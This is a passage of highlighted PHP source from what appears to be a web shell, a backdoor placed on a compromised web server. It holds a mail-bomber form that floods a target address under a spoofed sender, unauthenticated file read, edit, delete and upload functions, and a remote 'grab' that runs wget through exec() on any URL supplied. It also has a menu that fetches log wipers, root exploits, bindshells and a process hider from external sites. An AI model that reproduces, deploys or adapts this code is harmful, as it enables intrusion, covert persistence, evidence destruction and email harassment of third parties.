<span class="lineno">704</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;h2&gt;Mail Bomber&lt;/h2&gt;</span>
<span class="lineno">705</span> <span class="s2">  &lt;form method=&#39;POST&#39; action=&#39;?act=email&#39;&gt;</span>
<span class="lineno">706</span> <span class="s2">  &lt;b&gt;Your address:&lt;/b&gt;&lt;br&gt;</span>
<span class="lineno">707</span> <span class="s2">  &lt;input name=&#39;from&#39; type=&#39;text&#39; size=&#39;35&#39;&gt;&lt;br&gt;</span>
<span class="lineno">708</span> <span class="s2">  &lt;b&gt;Their address:&lt;/b&gt;&lt;br&gt;</span>
<span class="lineno">709</span> <span class="s2">  &lt;input name=&#39;to&#39; type=&#39;text&#39; size=&#39;35&#39;&gt;&lt;br&gt;</span>
<span class="lineno">710</span> <span class="s2">  &lt;b&gt;Subject:&lt;/b&gt;&lt;br&gt;</span>
<span class="lineno">711</span> <span class="s2">  &lt;input name=&#39;subject&#39; type=&#39;text&#39; size=&#39;35&#39;&gt;&lt;br&gt;</span>
<span class="lineno">712</span> <span class="s2">  &lt;b&gt;Text:&lt;/b&gt;&lt;br&gt;</span>
<span class="lineno">713</span> <span class="s2">  &lt;input name=&#39;body&#39; type=&#39;text&#39; size=&#39;35&#39;&gt;&lt;br&gt;</span>
<span class="lineno">714</span> <span class="s2">  &lt;b&gt;How many times:&lt;/b&gt;&lt;br&gt;</span>
<span class="lineno">715</span> <span class="s2">  &lt;input name=&#39;times&#39; type=&#39;text&#39; size=&#39;5&#39;&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno">716</span> <span class="s2">  &lt;input name=&#39;submit&#39; type=&#39;submit&#39; value=&#39;Submit&#39;&gt;</span>
<span class="lineno">717</span> <span class="s2">  &lt;/form&gt;&quot;</span><span class="p">);</span>
<span class="lineno">718</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$to</span> <span class="o">&amp;&amp;</span> <span class="nv">$from</span><span class="p">){</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$times</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="nb">mail</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$to</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$subject</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$body</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;From: </span><span class="si">$from</span><span class="s2">&quot;</span><span class="p">);}}</span>
<span class="lineno">719</span> <span class="p">}</span>
<span class="lineno">720</span> <span class="k">function</span> <span class="nf">view</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$dir</span><span class="p">){</span> <span class="c1">// File view function</span>
<span class="lineno">721</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fileact&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;Download&quot;</span><span class="p">){</span>
<span class="lineno">722</span>     <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
<span class="lineno">723</span>     <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">]));</span>
<span class="lineno">724</span>     <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=&quot;</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;;&quot;</span><span class="p">);</span>
<span class="lineno">725</span>     <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span>
<span class="lineno">726</span>     <span class="k">echo</span><span class="p">(</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)));</span>
<span class="lineno">727</span>     <span class="k">die</span><span class="p">();</span>
<span class="lineno">728</span>   <span class="p">}</span>
<span class="lineno">729</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">730</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fileact&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;Save&quot;</span><span class="p">){</span>
<span class="lineno">731</span>     <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
<span class="lineno">732</span>     <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">]));</span>
<span class="lineno">733</span>     <span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
<span class="lineno">734</span>     <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Saved file.&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">735</span>     <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=&#39;?act=view&amp;f=</span><span class="si">$filename</span><span class="s2">&amp;dir=nullz&#39;&gt;Go back&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="lineno">736</span>     <span class="k">die</span><span class="p">();</span>
<span class="lineno">737</span>   <span class="p">}</span>
<span class="lineno">738</span>   <span class="k">elseif</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fileact&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;Delete&quot;</span><span class="p">){</span>
<span class="lineno">739</span>     <span class="nb">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
<span class="lineno">740</span>     <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Deleted file.&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">741</span>     <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=&#39;?act=files&#39;&gt;Go back&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="lineno">742</span>     <span class="k">die</span><span class="p">();</span>
<span class="lineno">743</span>   <span class="p">}</span>
<span class="lineno">744</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">!=</span> <span class="s2">&quot;nullz&quot;</span><span class="p">){</span> <span class="c1">// heh</span>
<span class="lineno">745</span>     <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
<span class="lineno">746</span>   <span class="p">}</span>
<span class="lineno">747</span>   <span class="nv">$bad</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">748</span>   <span class="nv">$good</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">749</span>   <span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
<span class="lineno">750</span>   <span class="nv">$content</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
<span class="lineno">751</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;form name=&#39;file&#39; method=&#39;POST&#39; action=&#39;?act=view&amp;dir=</span><span class="si">$dir</span><span class="s2">&amp;f=</span><span class="si">$filename</span><span class="s2">&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">752</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;textarea style=&#39;width:100%; height:92%;&#39; name=&#39;contents&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">753</span>   <span class="k">echo</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$bad</span><span class="p">,</span> <span class="nv">$good</span><span class="p">,</span> <span class="nv">$content</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">754</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/textarea&gt;&quot;</span><span class="p">);</span>
<span class="lineno">755</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input name=&#39;fileact&#39; type=&#39;submit&#39; value=&#39;Save&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">756</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input name=&#39;fileact&#39; type=&#39;submit&#39; value=&#39;Delete&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">757</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input name=&#39;fileact&#39; type=&#39;submit&#39; value=&#39;Download&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">758</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/form&gt;&quot;</span><span class="p">);</span>
<span class="lineno">759</span> <span class="p">}</span>
<span class="lineno">760</span> <span class="k">function</span> <span class="nf">edit</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">){</span> <span class="c1">// File edit function</span>
<span class="lineno">761</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">762</span>   <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
<span class="lineno">763</span>   <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
<span class="lineno">764</span>   <span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
<span class="lineno">765</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Saved file.&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">766</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=&#39;?act=files&#39;&gt;Go back&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="lineno">767</span> <span class="p">}</span>
<span class="lineno">768</span> <span class="k">function</span> <span class="nf">upload</span><span class="p">(){</span> <span class="c1">// Uploading frontend function</span>
<span class="lineno">769</span>   <span class="k">global</span> <span class="nv">$curdir</span><span class="p">;</span>
<span class="lineno">770</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">771</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;form name=&#39;files&#39; enctype=&#39;multipart/form-data&#39; method=&#39;POST&#39;&gt;</span>
<span class="lineno">772</span> <span class="s2">  &lt;b&gt;Output Directory&lt;/b&gt;&lt;br&gt;</span>
<span class="lineno">773</span> <span class="s2">  &lt;input type=&#39;text&#39; name=&#39;loc&#39; size=&#39;65&#39; value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$curdir</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno">774</span> <span class="s2">  &lt;b&gt;Remote Upload&lt;/b&gt;&lt;br&gt;</span>
<span class="lineno">775</span> <span class="s2">  &lt;input type=&#39;text&#39; name=&#39;rem&#39; size=&#39;65&#39;&gt;</span>
<span class="lineno">776</span> <span class="s2">  &lt;input type=&#39;submit&#39; value=&#39;Grab&#39;&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno">777</span> <span class="s2">  &lt;b&gt;Local File Upload&lt;/b&gt;&lt;br&gt;</span>
<span class="lineno">778</span> <span class="s2">  &lt;input name=&#39;up&#39; type=&#39;file&#39; size=&#39;65&#39;&gt;</span>
<span class="lineno">779</span> <span class="s2">  &lt;input type=&#39;submit&#39; value=&#39;Upload&#39;&gt;</span>
<span class="lineno">780</span> <span class="s2">  &lt;/form&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">781</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rem&#39;</span><span class="p">]){</span><span class="nx">grab</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rem&#39;</span><span class="p">]);}</span>
<span class="lineno">782</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up&#39;</span><span class="p">]){</span><span class="nx">up</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up&#39;</span><span class="p">]);}</span>
<span class="lineno">783</span> <span class="p">}</span>
<span class="lineno">784</span> <span class="k">function</span> <span class="nf">up</span><span class="p">(</span><span class="nv">$up</span><span class="p">){</span> <span class="c1">// Uploading backend function</span>
<span class="lineno">785</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">786</span>   <span class="nv">$updir</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;loc&#39;</span><span class="p">];</span>
<span class="lineno">787</span>   <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$up</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">],</span> <span class="nv">$updir</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="nv">$up</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
<span class="lineno">788</span>   <span class="k">die</span><span class="p">(</span><span class="s2">&quot;File has been uploaded.&quot;</span><span class="p">);</span>
<span class="lineno">789</span> <span class="p">}</span>
<span class="lineno">790</span> <span class="k">function</span> <span class="nf">grab</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span> <span class="c1">// Uploading backend function</span>
<span class="lineno">791</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">792</span>   <span class="nv">$updir</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;loc&#39;</span><span class="p">];</span>
<span class="lineno">793</span>   <span class="nv">$filex</span> <span class="o">=</span> <span class="nb">array_pop</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">));</span>
<span class="lineno">794</span>   <span class="k">if</span><span class="p">(</span><span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;wget </span><span class="si">$file</span><span class="s2"> -b -O </span><span class="si">$updir</span><span class="s2">/</span><span class="si">$filex</span><span class="s2">&quot;</span><span class="p">)){</span><span class="k">die</span><span class="p">(</span><span class="s2">&quot;File has been uploaded.&quot;</span><span class="p">);}</span>
<span class="lineno">795</span>   <span class="k">else</span><span class="p">{</span><span class="k">die</span><span class="p">(</span><span class="s2">&quot;File upload failed.&quot;</span><span class="p">);}</span>
<span class="lineno">796</span> <span class="p">}</span>
<span class="lineno">797</span> <span class="k">function</span> <span class="nf">tools</span><span class="p">(){</span> <span class="c1">// Useful tools function</span>
<span class="lineno">798</span>   <span class="k">global</span> <span class="nv">$curdir</span><span class="p">;</span>
<span class="lineno">799</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">800</span>   <span class="nv">$tools</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">801</span>   <span class="s2">&quot;--- Log wipers ---&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;1&quot;</span><span class="p">,</span>
<span class="lineno">802</span>   <span class="s2">&quot;Vanish2.tgz&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://packetstormsecurity.org/UNIX/penetration/log-wipers/vanish2.tgz&quot;</span><span class="p">,</span>
<span class="lineno">803</span>   <span class="s2">&quot;Cloak.c&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://packetstormsecurity.org/UNIX/penetration/log-wipers/cloak.c&quot;</span><span class="p">,</span>
<span class="lineno">804</span>   <span class="s2">&quot;gh0st.sh&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://packetstormsecurity.org/UNIX/penetration/log-wipers/gh0st.sh&quot;</span><span class="p">,</span>
<span class="lineno">805</span>   <span class="s2">&quot;--- Priv Escalation ---&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;2&quot;</span><span class="p">,</span>
<span class="lineno">806</span>   <span class="s2">&quot;h00lyshit - Linux 2.6 ALL&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://someshit.net/files/xpl/h00lyshit&quot;</span><span class="p">,</span>
<span class="lineno">807</span>   <span class="s2">&quot;k-rad3 - Linux &lt;= 2.6.11&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://someshit.net/files/xpl/krad3&quot;</span><span class="p">,</span>
<span class="lineno">808</span>   <span class="s2">&quot;raptor - Linux &lt;= 2.6.17.4&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://someshit.net/files/xpl/raptor&quot;</span><span class="p">,</span>
<span class="lineno">809</span>   <span class="s2">&quot;rootbsd - BSD v?&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://someshit.net/files/xpl/rootbsd&quot;</span><span class="p">,</span>
<span class="lineno">810</span>   <span class="s2">&quot;--- Bindshells ---&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;3&quot;</span><span class="p">,</span>
<span class="lineno">811</span>   <span class="s2">&quot;THC rwwwshell-1.6.perl&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://packetstormsecurity.org/groups/thc/rwwwshell-1.6.perl&quot;</span><span class="p">,</span>
<span class="lineno">812</span>   <span class="s2">&quot;Basic Perl bindshell&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://packetstormsecurity.org/groups/synnergy/bindshell-unix&quot;</span><span class="p">,</span>
<span class="lineno">813</span>   <span class="s2">&quot;--- Misc ---&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;4&quot;</span><span class="p">,</span>
<span class="lineno">814</span>   <span class="s2">&quot;MOCKS SOCKS4 Proxy&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://superb-east.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz&quot;</span><span class="p">,</span>
<span class="lineno">815</span>   <span class="s2">&quot;xps.c (proc hider)&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;http://packetstormsecurity.org/groups/shadowpenguin/unix-tools/xps.c&quot;</span><span class="p">);</span>
<span class="lineno">816</span>   <span class="nv">$names</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$tools</span><span class="p">);</span>
<span class="lineno">817</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Tools:&lt;/b&gt;&quot;</span><span class="p">);</span>
<span class="lineno">818</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;form method=&#39;post&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">819</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Output Directory&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">820</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input type=&#39;text&#39; name=&#39;loc&#39; size=&#39;65&#39; value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$curdir</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">821</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;select name=&#39;gf&#39; style=&#39;align:center;&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">822</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$tools</span> <span class="k">as</span> <span class="nv">$tool</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;option value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$tool</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$names</span><span class="p">[</span><span class="nv">$tool</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;/option&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
<span class="lineno">823</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/select&gt;&quot;</span><span class="p">);</span>
<span class="lineno">824</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;br&gt;&lt;input type=&#39;submit&#39; value=&#39;Grab&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">825</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/form&gt;&quot;</span><span class="p">);</span>
<span class="lineno">826</span> <span class="p">}</span>
<span class="lineno">827</span> <span class="k">function</span> <span class="nf">lookup</span><span class="p">(){</span> <span class="c1">// Domain lookup function</span>
<span class="lineno">828</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">829</span>   <span class="k">global</span> <span class="nv">$servinf</span><span class="p">;</span>
<span class="lineno">830</span>   <span class="nv">$script</span> <span class="o">=</span> <span class="s2">&quot;import urllib, urllib2, sys, re</span>
<span class="lineno">831</span> <span class="s2">  req = urllib2.Request(&#39;http://www.seologs.com/ip-domains.html&#39;, urllib.urlencode({&#39;domainname&#39; : sys.argv[1]}))</span>
<span class="lineno">832</span> <span class="s2">  site = re.findall(&#39;.+\) (.+)&lt;br&gt;&#39;, urllib2.urlopen(req).read())</span>
<span class="lineno">833</span> <span class="s2">  for i in xrange(0,len(site)):</span>
<span class="lineno">834</span> <span class="s2">    print site[i]&quot;</span><span class="p">;</span> <span class="c1">// My sexy python script</span>
<span class="lineno">835</span>   <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;lookup.py&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
<span class="lineno">836</span>   <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nv">$script</span><span class="p">);</span>
<span class="lineno">837</span>   <span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
<span class="lineno">838</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;h4&gt;Domains&lt;/h4&gt;&quot;</span><span class="p">);</span>
<span class="lineno">839</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;ul&gt;&quot;</span><span class="p">);</span>
<span class="lineno">840</span>   <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;python lookup.py &quot;</span> <span class="o">.</span> <span class="nv">$servinf</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$ret</span><span class="p">);</span>
<span class="lineno">841</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$ret</span> <span class="k">as</span> <span class="nv">$site</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;li&gt;&quot;</span> <span class="o">.</span> <span class="nv">$site</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
<span class="lineno">842</span>   <span class="nb">unlink</span><span class="p">(</span><span class="s1">&#39;lookup.py&#39;</span><span class="p">);</span>
<span class="lineno">843</span> <span class="p">}</span>
<span class="lineno">844</span> <span class="k">function</span> <span class="nf">img</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span> <span class="c1">// Images function</span>
<span class="lineno">845</span>   <span class="nv">$images</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">846</span>   <span class="s2">&quot;folder&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAA&quot;</span> <span class="o">.</span>
<span class="lineno">847</span>   <span class="s2">&quot;gALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwq&quot;</span> <span class="o">.</span>
<span class="lineno">848</span>   <span class="s2">&quot;d1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=&quot;</span><span class="p">,</span>
<span class="lineno">849</span>   <span class="s2">&quot;image&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;R0lGODlhFAAWAOMAAP////8zM8z//8zMzJmZmWZmZmYAADMzMwCZzACZMwAzZgAAAAAAAAAAAAAAAAAAACH+TlRoaX&quot;</span> <span class="o">.</span>
<span class="lineno">850</span>   <span class="s2">&quot;MgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1i&quot;</span> <span class="o">.</span>
<span class="lineno">851</span>   <span class="s2">&quot;ZXIgMTk5NQAh+QQBAAACACwAAAAAFAAWAAAEkPDISae4WBzAu99Hdm1eSYYZWXYqOgJBLAcDoNrYNssGsBy/4GsX6y&quot;</span> <span class="o">.</span>
<span class="lineno">852</span>   <span class="s2">&quot;2OyMWQ2OMQngSlBjZLWBM1AFSqkyU4A2tWywUMYt/wlTSIvgYGA/Zq3QwU7mmHvh4g8GUsfAUHCH95NwMHV4SGh4Ed&quot;</span> <span class="o">.</span>
<span class="lineno">853</span>   <span class="s2">&quot;ihOOjy8rZpSVeiV+mYCWHncKo6Sfm5cliAdQrK1PQBlJsrNSEQA7&quot;</span><span class="p">,</span>
<span class="lineno">854</span>   <span class="s2">&quot;unknown&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;R0lGODlhFAAWAMIAAP///8z//5mZmTMzMwAAAAAAAAAAAAAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG&quot;</span> <span class="o">.</span>
<span class="lineno">855</span>   <span class="s2">&quot;9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAABACwAAAAAFAAW&quot;</span> <span class="o">.</span>
<span class="lineno">856</span>   <span class="s2">&quot;AAADaDi6vPEwDECrnSO+aTvPEQcIAmGaIrhR5XmKgMq1LkoMN7ECrjDWp52r0iPpJJ0KjUAq7SxLE+sI+9V8vycFiM&quot;</span> <span class="o">.</span>
<span class="lineno">857</span>   <span class="s2">&quot;0iLb2O80s8JcfVJJTaGYrZYPNby5Ov6WolPD+XDJqAgSQ4EUCGQQEJADs=&quot;</span><span class="p">,</span>
<span class="lineno">858</span>   <span class="s2">&quot;binary&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;R0lGODlhFAAWAMIAAP///8z//8zMzJmZmTMzMwAAAAAAAAAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG&quot;</span> <span class="o">.</span>
<span class="lineno">859</span>   <span class="s2">&quot;9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAABACwAAAAAFAAW&quot;</span> <span class="o">.</span>
<span class="lineno">860</span>   <span class="s2">&quot;AAADaUi6vPEwEECrnSS+WQoQXSEAE6lxXgeopQmha+q1rhTfakHo/HaDnVFo6LMYKYPkoOADim4VJdOWkx2XvirUgq&quot;</span> <span class="o">.</span>
<span class="lineno">861</span>   <span class="s2">&quot;VaVcbuxCn0hKe04znrIV/ROOvaG3+z63OYO6/uiwlKgYJJOxFDh4hTCQA7&quot;</span><span class="p">,</span>
<span class="lineno">862</span>   <span class="s2">&quot;text&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;R0lGODlhFAAWAOMAAP/////MM/8zM8z//5mZmZlmM2bM/zMzMwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH+TlRoaX&quot;</span> <span class="o">.</span>
<span class="lineno">863</span>   <span class="s2">&quot;MgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1i&quot;</span> <span class="o">.</span>
<span class="lineno">864</span>   <span class="s2">&quot;ZXIgMTk5NQAh+QQBAAADACwAAAAAFAAWAAAEb/DISee4eBzAu99Hdm1eSYbZWXEkgI5sEBg0+2HnTBsccvhAmGtXAy&quot;</span> <span class="o">.</span>
<span class="lineno">865</span>   <span class="s2">&quot;COSITwUGg2PYQoQalhOZ/QKLVV6gKmQm8XXDUmzx0yV5ze9s7JdpgtL3ME5jhHTS/xO3hwdWt0f317WwdSi4xRPxlw&quot;</span> <span class="o">.</span>
<span class="lineno">866</span>   <span class="s2">&quot;kUgXEQA7&quot;</span><span class="p">,</span>
